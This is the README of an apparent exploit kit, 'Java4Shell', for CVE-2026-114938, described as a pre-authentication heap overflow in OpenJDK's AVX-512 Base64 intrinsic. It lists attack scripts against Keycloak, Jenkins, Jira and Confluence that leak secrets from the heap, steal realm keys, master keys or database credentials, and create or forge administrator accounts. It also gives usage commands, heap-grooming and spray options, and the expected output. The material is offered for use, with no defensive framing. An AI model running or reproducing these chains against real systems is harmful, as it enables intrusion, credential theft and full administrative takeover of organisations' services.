# Java4Shell Exploit Chains — CVE-2026-114938

Heap overflow in OpenJDK's AVX-512 Base64 intrinsic. Malformed `Authorization: Basic` header triggers 62-byte OOB write before authentication. Requires CPU with AVX-512 VBMI (Intel Ice Lake+ / AMD Zen 4+).

## Scripts

| Script | Target | Takeover Method |
|--------|--------|-----------------|
| `keycloak_chain.py` | Keycloak 26.x | Steal HS256/512 realm key → forge admin JWT |
| `jenkins_chain.py` | Jenkins LTS | Steal AES master key / session → Groovy Script Console |
| `jira_chain.py` | Atlassian Jira | Steal DB creds / Crowd SSO → REST API admin create |
| `confluence_chain.py` | Atlassian Confluence | Steal DB creds / Crowd SSO → REST API admin create |

## Usage

```bash
python3 keycloak_chain.py  --url http://keycloak:8080
python3 jenkins_chain.py   --url http://jenkins:8080
python3 jira_chain.py      --url http://jira:8080
python3 confluence_chain.py --url http://confluence:8090
```

## Options

```
--url URL          Target base URL (required)
--creds USER:PASS  Valid creds for warmup (default: admin:admin)
--warmup N         JIT warmup requests (default: 5000)
--attempts N       Max grooming attempts (default: 24)
--spray N          Connections per spray (default: 40)
--username NAME    Admin user to create (default: java4shell-admin)
--jdk17            Use 129-byte trigger for JDK 17 targets
```

## What to expect

Without AVX-512 VBMI CPU: all grooming attempts miss. HTTP 401 is normal — Base64 decodes but no overflow occurs.

With AVX-512 VBMI CPU: successful runs show `HEAP DISCLOSURE` → secret extraction → admin takeover.
